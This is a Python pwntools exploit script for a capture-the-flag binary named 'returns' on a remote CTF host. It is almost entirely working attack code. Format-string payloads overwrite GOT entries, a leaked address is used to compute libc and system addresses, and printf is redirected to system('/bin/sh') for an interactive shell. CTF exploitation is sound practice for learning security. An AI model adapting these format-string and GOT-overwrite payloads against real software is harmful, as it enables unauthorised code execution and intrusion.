#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 19307 returns
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('returns')
context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 19307)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# We need to overwrite puts_got to make a loop
# jumping right before fgets call.
got_puts = 0x404018
before_fgets = 0x40122e

payload = "%018u%12$hhn%028u%13$hhn" # set 40122e
payload += 'a'
payload += '\x00' * (32-len(payload))
payload += p64(got_puts+1)
payload += p64(got_puts)
payload += '\n'

# now we have a loop

io.recvuntil('return? ')
io.send(payload)

# ---------------

io.recvuntil('with you. ')

payload2 = "%18$p"
payload2 += '\n'

io.send(payload2)
io.recvuntil('sell you a ')
libc_leak_hex_str = io.recvuntil('.') # (__libc_start_main+240) 
print(libc_leak_hex_str[:-1])
libc_start_main_addr_240 = int(libc_leak_hex_str[2:-1], 16)

libc_start_main_addr = libc_start_main_addr_240 - 240
libc_start_main_offset = 0x20740
libc_base_addr = libc_start_main_addr - libc_start_main_offset

print("libc base addr: {}".format(hex(libc_base_addr)))

libc_system_offset = 0x45390
libc_system_addr = libc_base_addr + libc_system_offset

print("__libc_system addr: {}".format(hex(libc_system_addr)))

# ---------------

io.recvuntil('with you. ')

got_printf = 0x404038

# got_printf: example_libc_printf_addr = 0x00007ffff7a62800
# ^ this rewtite to this v
# got_printf: example_libc_system_addr = 0x00007ffff7XXXXXX
# In most cases we need only to overwrite 3 bytes, but
# buffer is to short to do this, so we'll overwrite 4 bytes
# at once.

# system("/bin/sh;junk_blahblah") works
payload = "/bin/sh;"

# lowest 4B
to_write = libc_system_addr & 0xffffffff
to_write -= len("/bin/sh;")

#payload += "%0{}u%14$n".format(to_write)
payload += "%0{}u%14$n".format(to_write)
payload += 'a' # overwritten with NULLBYTE by binary itself
print("nulls: {}".format( len(payload))) # at least one NULLBYTE required
payload += '\x00' * ((8 - len(payload)) % 8)
# aligned to 8B
assert(payload[-1] == '\x00') # at least one NULLBYTE required


payload += p64(got_printf)
payload += '\n'


print("sending last payload! len = {}".format(len(payload)))
print("payload: \n{}\n".format( payload.encode('hex')))
assert(len(payload) <= 50)

io.send(payload)

io.interactive()

